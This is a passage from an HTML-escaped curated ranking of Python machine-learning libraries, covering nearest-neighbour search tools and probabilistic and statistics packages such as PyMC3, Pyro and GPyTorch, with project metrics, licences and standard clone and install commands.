· ⏱️ 16.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install ngt&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/kakao/n2&#34;&gt;N2&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 520 · 💤) - TOROS N2 - lightweight approximate Nearest Neighbor library which runs.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/kakao/n2&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 64 · 📦 23 · 📋 39 - 43% open · ⏱️ 20.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/kakao/n2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/n2&#34;&gt;PyPi&lt;/a&gt; (📥 580 / month · 📦 3 · ⏱️ 16.10.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install n2&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 3 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/plasticityai/magnitude&#34;&gt;Magnitude&lt;/a&gt;&lt;/b&gt; (🥉23 · ⭐ 1.5K · 💀) - A fast, efficient universal vector embedding utility package. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pixelogik/NearPy&#34;&gt;NearPy&lt;/a&gt;&lt;/b&gt; (🥉21 · ⭐ 710 · 💀) - Python framework for fast (approximated) nearest neighbour search in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/facebookresearch/pysparnn&#34;&gt;PySparNN&lt;/a&gt;&lt;/b&gt; (🥉11 · ⭐ 900 · 💀) - Approximate Nearest Neighbor Search for Sparse Data in Python!. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;br&gt; &#xA;&lt;h2&gt;Probabilistics &amp;amp; Statistics&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/ml-tooling/best-of-ml-python/main/#contents&#34;&gt;&lt;img align=&#34;right&#34; width=&#34;15&#34; height=&#34;15&#34; src=&#34;https://git.io/JtehR&#34; alt=&#34;Back to top&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Libraries providing capabilities for probabilistic programming/reasoning, bayesian inference, gaussian processes, or statistics.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pymc-devs/pymc&#34;&gt;PyMC3&lt;/a&gt;&lt;/b&gt; (🥇40 · ⭐ 6.6K) - Probabilistic Programming in Python: Bayesian Modeling and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pymc-devs/pymc&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 380 · 🔀 1.6K · 📥 1.9K · 📦 620 · 📋 2.7K - 7% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pymc-devs/pymc&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pymc3&#34;&gt;PyPi&lt;/a&gt; (📥 360K / month · 📦 240 · ⏱️ 15.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pymc3&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pymc3&#34;&gt;Conda&lt;/a&gt; (📥 410K · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pymc3&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/tensorflow/probability&#34;&gt;tensorflow-probability&lt;/a&gt;&lt;/b&gt; (🥇37 · ⭐ 3.7K) - Probabilistic reasoning and statistical analysis in.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/tensorflow/probability&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 450 · 🔀 970 · 📋 1.2K - 44% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/tensorflow/probability&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/tensorflow-probability&#34;&gt;PyPi&lt;/a&gt; (📥 950K / month · 📦 310 · ⏱️ 14.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install tensorflow-probability&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/tensorflow-probability&#34;&gt;Conda&lt;/a&gt; (📥 57K · ⏱️ 26.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge tensorflow-probability&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyro-ppl/pyro&#34;&gt;Pyro&lt;/a&gt;&lt;/b&gt; (🥇33 · ⭐ 7.5K) - Deep universal probabilistic programming with Python and PyTorch. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyro-ppl/pyro&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 130 · 🔀 920 · 📦 720 · 📋 980 - 22% open · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyro-ppl/pyro&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyro-ppl&#34;&gt;PyPi&lt;/a&gt; (📥 180K / month · 📦 59 · ⏱️ 24.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyro-ppl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyro-ppl&#34;&gt;Conda&lt;/a&gt; (📥 8.9K · ⏱️ 24.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyro-ppl&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/cornellius-gp/gpytorch&#34;&gt;GPyTorch&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.8K) - A highly efficient and modular implementation of Gaussian Processes.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/cornellius-gp/gpytorch&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 93 · 🔀 420 · 📦 580 · 📋 1.1K - 26% open · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/cornellius-gp/gpytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gpytorch&#34;&gt;PyPi&lt;/a&gt; (📥 190K / month · 📦 38 · ⏱️ 04.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gpytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/gpytorch&#34;&gt;Conda&lt;/a&gt; (📥 34K · ⏱️ 14.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge gpytorch&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/hmmlearn/hmmlearn&#34;&gt;hmmlearn&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.5K) - Hidden Markov Models in Python, with scikit-learn like API. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1F&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/hmmlearn/hmmlearn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 40 · 🔀 700 · 📦 1.3K · 📋 390 - 13% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/hmmlearn/hmmlearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/hmmlearn&#34;&gt;PyPi&lt;/a&gt; (📥 390K / month · 📦 130 · ⏱️ 10.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install hmmlearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/hmmlearn&#34;&gt;Conda&lt;/a&gt; (📥 120K · ⏱️ 12.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge hmmlearn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/rlabbe/filterpy&#34;&gt;filterpy&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.3K · 💤) - Python Kalman filtering and optimal estimation library. Implements.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/rlabbe/filterpy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 510 · 📦 1.4K · 📋 210 - 26% open · ⏱️ 04.05.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/rlabbe/filterpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/filterpy&#34;&gt;PyPi&lt;/a&gt; (📥 690K / month · 📦 130 · ⏱️ 10.10.2018):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install filterpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/filterpy&#34;&gt;Conda&lt;/a&gt; (📥 95K · ⏱️ 05.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge filterpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pgmpy/pgmpy&#34;&gt;pgmpy&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.1K) - Python Library for learning (Structure and Parameter), inference.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pgmpy/pgmpy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 110 · 🔀 630 · 📥 150 · 📦 360 · 📋 790 - 28% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pgmpy/pgmpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pgmpy&#34;&gt;PyPi&lt;/a&gt; (📥 97K / month · 📦 11 · ⏱️ 30.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pgmpy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/GPflow/GPflow&#34;&gt;GPflow&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 1.6K) - Gaussian processes in TensorFlow. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/GPflow/GPflow&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 78 · 🔀 420 · 📦 360 · 📋 780 - 17% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/GPflow/GPflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/gpflow&#34;&gt;PyPi&lt;/a&gt; (📥 23K / month · 📦 29 · ⏱️ 10.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install gpflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/gpflow&#34;&gt;Conda&lt;/a&gt; (📥 12K · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge gpflow&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/twopirllc/pandas-ta&#34;&gt;pandas-ta&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 2.5K) - Technical Analysis Indicators - Pandas TA is an easy to use.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/twopirllc/pandas-ta&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 44 · 🔀 560 · 📦 660 · 📋 390 - 13% open · ⏱️ 31.01.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/twopirllc/pandas-ta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pandas-ta&#34;&gt;PyPi&lt;/a&gt; (📥 76K / month · 📦 16 · ⏱️ 28.07.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pandas-ta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pandas-ta&#34;&gt;Conda&lt;/a&gt; (📥 800 · ⏱️ 05.10.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pandas-ta&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pydata/patsy&#34;&gt;patsy&lt;/a&gt;&lt;/b&gt; (🥈29 · ⭐ 830 · 💤) - Describing statistical models in Python using symbolic formulas. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3rqEWVr&#34;&gt;BSD-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pydata/patsy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 94 · 📦 52K · 📋 140 - 51% open · ⏱️ 26.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pydata/patsy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/patsy&#34;&gt;PyPi&lt;/a&gt; (📥 9.5M / month · 📦 2.6K · ⏱️ 26.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install patsy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/patsy&#34;&gt;Conda&lt;/a&gt; (📥 4.8M · ⏱️ 26.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge patsy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/jmschrei/pomegranate&#34;&gt;pomegranate&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 2.9K) - Fast, flexible and easy to use probabilistic modelling in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/jmschrei/pomegranate&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 65 · 🔀 530 · 📦 690 · 📋 660 - 7% open · ⏱️ 21.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/jmschrei/pomegranate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pomegranate&#34;&gt;PyPi&lt;/a&gt; (📥 35K / month · 📦 46 · ⏱️ 21.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pomegranate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pomegranate&#34;&gt;Conda&lt;/a&gt; (📥 86K · ⏱️ 16.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pomegranate&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/SALib/SALib&#34;&gt;SALib&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 590) - Sensitivity Analysis Library in Python. Contains Sobol, Morris, FAST, and.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/SALib/SALib&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 36 · 🔀 180 · 📋 280 - 16% open · ⏱️ 19.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/SALib/SALib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/salib&#34;&gt;PyPi&lt;/a&gt; (📥 130K / month · 📦 58 · ⏱️ 06.02.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install salib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/salib&#34;&gt;Conda&lt;/a&gt; (📥 81K · ⏱️ 04.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge salib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/uber/orbit&#34;&gt;Orbit&lt;/a&gt;&lt;/b&gt; (🥉26 · ⭐ 1.4K) - A Python package for Bayesian forecasting with object-oriented design.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/uber/orbit&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 16 · 🔀 99 · 📦 6 · 📋 370 - 16% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/uber/orbit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/orbit-ml&#34;&gt;PyPi&lt;/a&gt; (📥 46K / month · 📦 1 · ⏱️ 28.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install orbit-ml&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bambinos/bambi&#34;&gt;bambi&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 770) - BAyesian Model-Building Interface (Bambi) in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bambinos/bambi&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 25 · 🔀 86 · 📦 28 · 📋 250 - 15% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bambinos/bambi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/bambi&#34;&gt;PyPi&lt;/a&gt; (📥 4.6K / month · 📦 3 · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install bambi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/bambi&#34;&gt;Conda&lt;/a&gt; (📥 7.9K · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge bambi&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/baal-org/baal&#34;&gt;Baal&lt;/a&gt;&lt;/b&gt; (🥉19 · ⭐ 590) - Library to enable Bayesian active learning in your research or labeling.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/baal-org/baal&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 14 · 🔀 54 · 📋 75 - 24% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ElementAI/baal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/baal&#34;&gt;PyPi&lt;/a&gt; (📥 990 / month · 📦 1 · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install baal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/baal&#34;&gt;Conda&lt;/a&gt; (📥 1.5K · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge baal&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;Show 7 hidden projects...&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/blei-lab/edward&#34;&gt;Edward&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 4.7K · 💀) - A probabilistic programming language in TensorFlow. Deep.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/raphaelvallat/pingouin&#34;&gt;pingouin&lt;/a&gt;&lt;/b&gt; (🥉28 · ⭐ 1.1K) - Statistical package in Python based on Pandas. &lt;code&gt;&lt;a href=&#34;http://bit.ly/2M0xdwT&#34;&gt;❗️GPL-3.0&lt;/a&gt;&lt;/code&gt;&lt;/li&gt; &#xA;  &lt;li&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/stan-dev/pystan&#34;&gt;PyStan&lt;/a&gt;&lt;/b&gt; (🥉25 · ⭐ 190) - PyStan, a Python interface to Stan, a platform for statistical modeling... &lt;code&gt;&lt;a 